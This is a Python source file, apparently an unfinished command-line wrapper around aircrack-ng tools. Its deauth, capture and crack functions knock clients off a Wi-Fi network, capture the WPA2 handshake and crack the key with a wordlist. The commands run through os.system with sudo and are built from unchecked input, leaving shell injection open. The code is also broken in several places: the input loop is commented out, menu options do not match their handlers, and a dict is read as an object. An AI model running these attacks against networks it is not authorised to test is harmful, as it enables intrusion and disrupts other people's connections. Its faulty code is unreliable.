#!/bin/python
import sys
import os
import json

import nic as nic
import config as config

# This class contains state data used throughout the program
# This may need to move to its own file if it gets too large
class RuntimeData:
  def __init__(self, configFile):
    self.configFile = configFile

# Main script starts here
def main():
	# Check passed args
	if len(sys.argv) < 2:
		configFile = open(config.newFile(), "r")
		
	else:
		configFile = open(sys.argv[1], "r")
	
	runtimeData = json.load(configFile)
	configFile.close()
	
	#inputLoop(runtimeData)

def usage():
	if sys.platform == "win32":
		print("usage: python " + __file__ + " <device name> [channel]\n")
	else:
		print("usage: ./" + __file__ + " <device name> [channel]\n")

def inputLoop(runtimeData):
	command = "-1"
	menu()
	while command == "-1":
		command = input("> ")
		if command == "1":
			config.configInput(runtimeData)
			command = "-1"
		elif command == "2":
			#Show NIC menu
			nic.nicMenu()
			nic.nicInput(runtimeData)
			command = "-1"
		elif command == "3":
			#Fire airodump-ng
			capture(runtimeData)
			command = "-1"
		elif command == "4":
			#Fire aircrack-ng
			crack(runtimeData)
			command = "-1"
		elif command == "5":
			#Fire airmon-ng
			nic.listDevices(runtimeData)
			command = "-1"
		elif command == "?":
			usage()
			command = "-1"
		elif command == "quit" or command == "exit" or command == "e" or command == "q":
			break;
		else:
			menu()
			command = "-1"

#TODO FIX
def menu():
	print("1. Issue a deauthentication attack.")
	print("2. Set NIC to promiscous mode.")
	print("3. Capture an authentication packet.")
	print("4. Crack a WPA2 key.")
	print("5. List network interfaces.")
	print("6. Switch network interface")
	print("?  Usage")
	print("Enter one of the above commands:")

#TODO FIX
def deauth(runtimeData):
	#Aireplay command to send deauth packets
	bssid = input("Specify the BSSID of the wireless AP: ")
	target_mac = input("Specify the MAC address of the client you wish to deauthenticate: ")
	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + runtimeData.userNic
	os.system(cmd)	
	
#TODO FIX
def capture(runtimeData):
	#Airodump command to capture authentication traffic
	bssid = input("Please specify a BSSID: ")
	capFile = input("Please specify a capture file to save to: ")
	cmd = "sudo airodump-ng -c " + runtimeData.userChannel + " --bssid " + bssid + " -w " + capFile + " " + runtimeData.userNic
	os.system(cmd)

#TODO FIX
def crack(runtimeData):
	#Aircrack command to crack the key in the traffic dump
	wordList = input("Please specify a wordlist file: ")
	bssid = input("Please specify a BSSID: ")
	capFile = input("Please specify a capture file: ")
	cmd = "sudo aircrack-ng -w " + wordList + " -b " + bssid + " " + capFile
	os.system(cmd)

if __name__ == '__main__':
    main()
 
